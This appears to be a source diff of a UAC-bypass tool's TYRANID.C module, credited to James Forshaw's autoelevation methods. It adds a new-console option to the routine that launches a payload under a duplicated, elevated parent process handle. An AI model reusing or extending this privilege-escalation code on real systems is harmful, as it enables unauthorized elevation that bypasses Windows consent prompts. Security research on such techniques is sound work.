@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2017 - 2025
+*  (C) COPYRIGHT AUTHORS, 2017 - 2026
 *
 *  TITLE:       TYRANID.C
 *
-*  VERSION:     3.69
+*  VERSION:     3.70
 *
-*  DATE:        07 Jul 2025
+*  DATE:        07 May 2026
 *
 *  James Forshaw autoelevation method(s)
 *  Fine Dinning Tool (c) CIA
@@ -368,10 +368,12 @@ NTSTATUS ucmTokenModUIAccessMethod2(
 */
 NTSTATUS ucmxCreateProcessFromParent(
     _In_ HANDLE ParentProcess,
-    _In_ LPWSTR Payload)
+    _In_ LPWSTR Payload,
+    _In_ BOOL AllocateNewConsole)
 {
     NTSTATUS status = STATUS_UNSUCCESSFUL;
     SIZE_T size = 0x30;
+    DWORD flags = CREATE_UNICODE_ENVIRONMENT | EXTENDED_STARTUPINFO_PRESENT;
 
     STARTUPINFOEX si;
     PROCESS_INFORMATION pi;
@@ -399,7 +401,7 @@ NTSTATUS ucmxCreateProcessFromParent(
                         NULL,
                         NULL,
                         FALSE,
-                        CREATE_UNICODE_ENVIRONMENT | EXTENDED_STARTUPINFO_PRESENT,
+                        AllocateNewConsole ? flags | CREATE_NEW_CONSOLE: flags,
                         NULL,
                         g_ctx->szSystemRoot,
                         (LPSTARTUPINFO)&si,
@@ -559,7 +561,8 @@ NTSTATUS ucmDebugObjectMethod(
                 //
                 // Run new process with parent set to duplicated process handle.
                 //
-                ucmxCreateProcessFromParent(dupHandle, lpszPayload);
+                status = ucmxCreateProcessFromParent(dupHandle, lpszPayload, 
+                    ((g_ctx->OptionalParameterLength == 0) && (g_ctx->dwBuildNumber > NT_WIN11_21H2)));
                 NtClose(dupHandle);
                 dupHandle = NULL;
             }
